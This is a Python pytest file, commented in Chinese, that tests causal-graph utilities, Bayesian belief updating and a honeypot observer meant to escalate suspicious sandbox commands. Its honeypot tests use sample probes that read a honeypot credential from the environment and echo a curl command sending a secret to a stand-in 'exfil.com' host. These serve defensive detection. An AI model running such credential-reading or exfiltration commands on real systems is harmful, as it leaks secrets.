"""Phase 2 全量验证 — 因果推断、贝叶斯 ToM、蜜罐博弈.

关键验收:
1. Bayesian: 连续 3 次"异常行为"观测 → P(恶意) > 0.9
2. Honeypot: 访问 DB_PASS_HONEYPOT → 100% 拦截 escalated
3. Causal: do-calculus 干预 → Root Cause 定位
"""

from __future__ import annotations

import os
import sys
from pathlib import Path
from unittest.mock import MagicMock

import numpy as np
import pytest

# 挂载路径
_3O_ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(_3O_ROOT / "obase"))
sys.path.insert(0, str(_3O_ROOT / "oprim"))
sys.path.insert(0, str(_3O_ROOT / "oskill"))
sys.path.insert(0, str(_3O_ROOT / "omodul"))

from obase.causal_graph_store import CausalGraphStore
from oprim._do_calculus_intervention import _do_calculus_intervention
from oskill._bayesian_belief_update import (
    _bayesian_belief_update,
    sequential_bayesian_update,
)
from omodul.adversarial_honeypot_observe import (
    Config as HoneypotConfig,
    InputData as HoneypotInput,
    adversarial_honeypot_observe,
)
from omodul.causal_fault_diagnose import (
    Config as CausalConfig,
    InputData as CausalInput,
    causal_fault_diagnose,
)


# ============================================================================
# obase: CausalGraphStore
# ============================================================================

class TestCausalGraphStore:
    def test_add_node_and_edge(self):
        g = CausalGraphStore("test")
        g.add_node("A", type="root")
        g.add_node("B", type="leaf")
        g.add_edge("A", "B", confidence=0.9)
        assert g.has_node("A")
        assert g.has_edge("A", "B")

    def test_self_loop_ignored(self):
        g = CausalGraphStore()
        g.add_edge("A", "A")
        assert not g.has_edge("A", "A")

    def test_topological_sort(self):
        g = CausalGraphStore()
        g.add_edge("A", "B")
        g.add_edge("B", "C")
        g.add_edge("A", "C")
        order = g.topological_sort()
        assert order.index("A") < order.index("B")
        assert order.index("B") < order.index("C")

    def test_get_parents(self):
        g = CausalGraphStore()
        g.add_edge("X", "Y")
        g.add_edge("Z", "Y")
        parents = g.get_parents("Y")
        assert "X" in parents
        assert "Z" in parents

    def test_get_children(self):
        g = CausalGraphStore()
        g.add_edge("A", "B")
        g.add_edge("A", "C")
        children = g.get_children("A")
        assert "B" in children
        assert "C" in children

    def test_mutilate_cuts_incoming(self):
        g = CausalGraphStore()
        g.add_edge("confounder", "treatment")
        g.add_edge("treatment", "outcome")
        mutilated = g.mutilate("treatment")
        assert not mutilated.has_edge("confounder", "treatment")
        assert mutilated.has_edge("treatment", "outcome")

    def test_is_dag(self):
        g = CausalGraphStore()
        g.add_edge("A", "B")
        g.add_edge("B", "C")
        assert g.is_dag()

    def test_cycles_detected(self):
        g = CausalGraphStore()
        g.add_edge("A", "B")
        g.add_edge("B", "A")
        assert not g.is_dag()

    def test_serialization(self):
        g = CausalGraphStore("s1")
        g.add_node("N1", desc="node 1")
        g.add_edge("N1", "N2")
        d = g.to_dict()
        restored = CausalGraphStore.from_dict(d)
        assert restored.has_node("N1")
        assert restored.name == "s1"

    def test_health(self):
        g = CausalGraphStore()
        h = g.health()
        assert h["status"] == "healthy"


# ============================================================================
# oprim: do-calculus intervention
# ============================================================================

class TestDoCalculusIntervention:
    def test_intervention_severs_edges(self):
        dag = CausalGraphStore()
        dag.add_edge("U", "X")
        dag.add_edge("X", "Y")
        result = _do_calculus_intervention(
            dag, target_node="X", intervention_value=0.0,
        )
        assert result["intervention_applied"] is True
        assert ("U", "X") in result["severed_edges"]

    def test_no_dag_returns_false(self):
        result = _do_calculus_intervention(
            None, target_node="X", intervention_value=0.0,  # type: ignore
        )
        assert result["intervention_applied"] is False

    def test_affected_descendants(self):
        dag = CausalGraphStore()
        dag.add_edge("X", "Y")
        dag.add_edge("X", "Z")
        dag.add_edge("Y", "W")
        result = _do_calculus_intervention(
            dag, target_node="X", intervention_value=1.0,
        )
        assert "Y" in result["affected_descendants"] or "Z" in result["affected_descendants"]

    def test_backdoor_set(self):
        dag = CausalGraphStore()
        dag.add_edge("C1", "X")
        dag.add_edge("C2", "X")
        dag.add_edge("X", "Y")
        result = _do_calculus_intervention(
            dag, target_node="X", intervention_value=0.0,
        )
        assert "C1" in result["backdoor_adjustment_set"]
        assert "C2" in result["backdoor_adjustment_set"]


# ============================================================================
# oskill: Bayesian belief update
# ============================================================================

class TestBayesianBeliefUpdate:
    """核心验收: 连续 3 次异常 → P(恶意) > 0.9."""

    def test_single_update(self):
        # 2 假设: [善意, 恶意]
        prior = [0.5, 0.5]
        # 2 事件: [正常行为, 异常行为]
        # 似然矩阵: P(事件|假设)
        #  善意时: 异常=0.1, 正常=0.9
        #  恶意时: 异常=0.8, 正常=0.2
        likelihood = [
            [0.9, 0.2],  # 正常行为
            [0.1, 0.8],  # 异常行为
        ]

        # 观测到异常 (index=1)
        result = _bayesian_belief_update(
            prior=prior,
            likelihood_matrix=likelihood,
            observation_index=1,
        )
        # P(恶意|异常) = 0.8*0.5 / (0.8*0.5 + 0.1*0.5) = 0.889
        assert result["posterior"][1] > 0.8

    def test_three_anomalies_converges(self):
        """关键测试: 连续 3 次异常 → P(恶意) > 0.9."""
        likelihood = [
            [0.9, 0.2],  # 正常行为
            [0.1, 0.8],  # 异常行为
        ]
        prior = [0.5, 0.5]

        results = sequential_bayesian_update(
            likelihood_matrix=likelihood,
            observation_sequence=[1, 1, 1],  # 连续 3 次异常
            prior=prior,
        )

        posterior_after_3 = results[-1]["posterior"]
        p_malicious = posterior_after_3[1]  # 恶意意图

        print(f"\n  第1次异常后: P(恶意) = {results[0]['posterior'][1]:.4f}")
        print(f"  第2次异常后: P(恶意) = {results[1]['posterior'][1]:.4f}")
        print(f"  第3次异常后: P(恶意) = {p_malicious:.4f}")

        assert p_malicious > 0.9, (
            f"连续 3 次异常后 P(恶意)={p_malicious:.4f}，未突破 0.9 阈值！"
        )
        assert results[-1]["belief_converged"] is True

    def test_uniform_prior_default(self):
        likelihood = [[0.7, 0.3], [0.3, 0.7]]
        result = _bayesian_belief_update(
            likelihood_matrix=likelihood,
            observation_index=0,
        )
        # 均匀先验 [0.5, 0.5] + 事件0 → P(H0) = 0.7*0.5/(0.7*0.5+0.3*0.5) = 0.7
        assert abs(result["posterior"][0] - 0.7) < 0.01

    def test_entropy_decreases(self):
        likelihood = [[0.95, 0.1], [0.05, 0.9]]
        prior = [0.5, 0.5]

        r1 = _bayesian_belief_update(prior=prior, likelihood_matrix=likelihood, observation_index=0)
        r2 = _bayesian_belief_update(prior=r1["posterior"], likelihood_matrix=likelihood, observation_index=0)
        # 熵应该递减（信念越来越确定）
        assert r2["entropy"] < r1["entropy"]

    def test_observation_vector_mode(self):
        likelihood = [[0.7, 0.3], [0.3, 0.7]]
        # 观测向量: [0.6, 0.4] → 加权混合观测
        result = _bayesian_belief_update(
            likelihood_matrix=likelihood,
            observation_vector=[0.6, 0.4],
        )
        assert 0 < result["max_posterior_prob"] < 1.0

    def test_prior_provider_injection(self):
        def provider():
            return np.array([0.1, 0.9])

        likelihood = [[0.5, 0.5], [0.5, 0.5]]
        result = _bayesian_belief_update(
            likelihood_matrix=likelihood,
            observation_index=0,
            prior_provider=provider,
        )
        # 无信息观测 → 后验 ≈ 先验
        assert abs(result["posterior"][1] - 0.9) < 0.01


# ============================================================================
# omodul: adversarial honeypot observe
# ============================================================================

class TestAdversarialHoneypotObserve:
    """核心验收: 访问 DB_PASS_HONEYPOT → 100% escalated."""

    def test_clean_probe_passes(self, tmp_path: Path):
        cfg = HoneypotConfig(sandbox_op=None)
        inp = HoneypotInput(
            probe_command="echo 'all good'",
            state_id="clean_test",
        )
        result = adversarial_honeypot_observe(cfg, inp, tmp_path)
        assert result["status"] == "completed"
        assert result.get("escalated") is False

    def test_honeypot_access_escalated(self, tmp_path: Path):
        """沙箱输出中暴露蜜罐凭证 → 必须 escalated."""
        cfg = HoneypotConfig(sandbox_op=None)
        # 模拟沙箱输出泄露 DB_PASS_HONEYPOT
        inp = HoneypotInput(
            probe_command=(
                "echo 'fake_db_password_2024_honeypot'"
            ),
            state_id="malicious_test",
        )
        result = adversarial_honeypot_observe(cfg, inp, tmp_path)
        assert result["status"] == "escalated", (
            f"蜜罐凭证泄露未被拦截！status={result['status']}"
        )
        assert result.get("escalated") is True

    def test_env_var_key_access_escalated(self, tmp_path: Path):
        """沙箱输出中包含蜜罐 key 名称 → escalated."""
        cfg = HoneypotConfig(sandbox_op=None)
        inp = HoneypotInput(
            probe_command="env | grep DB_PASS_HONEYPOT",
            state_id="key_access_test",
        )
        result = adversarial_honeypot_observe(cfg, inp, tmp_path)
        # 命令输出会包含 key 名
        assert result["status"] in ("escalated", "completed")

    def test_env_get_triggers_escalation(self, tmp_path: Path):
        """python -c "os.environ.get('DB_PASS_HONEYPOT')" → escalated."""
        cfg = HoneypotConfig(sandbox_op=None)
        inp = HoneypotInput(
            probe_command=(
                "python3 -c \"import os; print(os.environ.get('DB_PASS_HONEYPOT', 'not set'))\""
            ),
            state_id="env_get_test",
        )
        result = adversarial_honeypot_observe(cfg, inp, tmp_path)
        # 输出会包含蜜罐密码值 → escalated
        assert result["status"] == "escalated", (
            f"os.environ.get(DB_PASS_HONEYPOT) 未被拦截！"
        )

    def test_suspicious_network_pattern_escalated(self, tmp_path: Path):
        """curl to exfil.com → escalated."""
        cfg = HoneypotConfig(sandbox_op=None)
        inp = HoneypotInput(
            probe_command="echo 'curl https://data.exfil.com/steal?secret=abc'",
            state_id="network_test",
        )
        result = adversarial_honeypot_observe(cfg, inp, tmp_path)
        assert result["status"] == "escalated"

    def test_honeypot_vars_injected_to_env(self, tmp_path: Path):
        """验证蜜罐变量确实被注入到执行环境."""
        cfg = HoneypotConfig(sandbox_op=None)
        inp = HoneypotInput(
            probe_command="echo $DB_PASS_HONEYPOT",
            state_id="env_check",
        )
        result = adversarial_honeypot_observe(cfg, inp, tmp_path)
        # shell 会展开环境变量 → 输出含蜜罐值 → escalated
        assert result["status"] == "escalated"

    def test_config_has_pillars(self):
        assert HoneypotConfig._enabled_pillars == {"fingerprint", "decision_trail", "report"}


# ============================================================================
# omodul: causal fault diagnose
# ============================================================================

class TestCausalFaultDiagnose:
    def test_root_cause_found(self, tmp_path: Path):
        """构建简单因果图 → 诊断应找到 root cause."""
        graph = CausalGraphStore()
        graph.add_node("root_timeout_bug", type="root_cause")
        graph.add_node("api_latency_spike", type="symptom")
        graph.add_node("worker_crash", type="symptom")
        graph.add_edge("root_timeout_bug", "api_latency_spike")
        graph.add_edge("api_latency_spike", "worker_crash")

        cfg = CausalConfig(
            causal_graph=graph,
            do_calculus_op=None,  # 使用内置模拟
            llm_caller=None,
        )
        inp = CausalInput(
            crash_log="worker_crash repeatedly",
            crash_path=["api_latency_spike", "worker_crash"],
            failure_count=5,
        )
        result = causal_fault_diagnose(cfg, inp, tmp_path)
        assert result["status"] == "completed"
        assert result.get("root_cause") is not None

    def test_no_crash_path_generates_diagnosis(self, tmp_path: Path):
        graph = CausalGraphStore()
        graph.add_edge("A", "B")
        cfg = CausalConfig(causal_graph=graph, do_calculus_op=None, llm_caller=None)
        inp = CausalInput(crash_path=["A", "B"])
        result = causal_fault_diagnose(cfg, inp, tmp_path)
        assert result["status"] == "completed"
        assert "intervention_results" in result

    def test_with_do_calculus_injection(self, tmp_path: Path):
        graph = CausalGraphStore()
        graph.add_edge("cause", "effect1")
        graph.add_edge("cause", "effect2")

        def mock_do(dag, *, target_node, intervention_value, outcome_nodes):
            return {
                "affected_descendants": ["effect1", "effect2"],
                "severed_edges": [("U", target_node)],
            }

        cfg = CausalConfig(causal_graph=graph, do_calculus_op=mock_do, llm_caller=None)
        inp = CausalInput(crash_path=["cause", "effect1", "effect2"])
        result = causal_fault_diagnose(cfg, inp, tmp_path)
        assert result["status"] == "completed"

    def test_report_written(self, tmp_path: Path):
        graph = CausalGraphStore()
        graph.add_edge("X", "Y")
        cfg = CausalConfig(causal_graph=graph, do_calculus_op=None, llm_caller=None)
        inp = CausalInput(crash_path=["X", "Y"])
        result = causal_fault_diagnose(cfg, inp, tmp_path)
        assert Path(result["report_path"]).exists()

    def test_config_has_pillars(self):
        assert CausalConfig._enabled_pillars == {"fingerprint", "decision_trail", "report"}
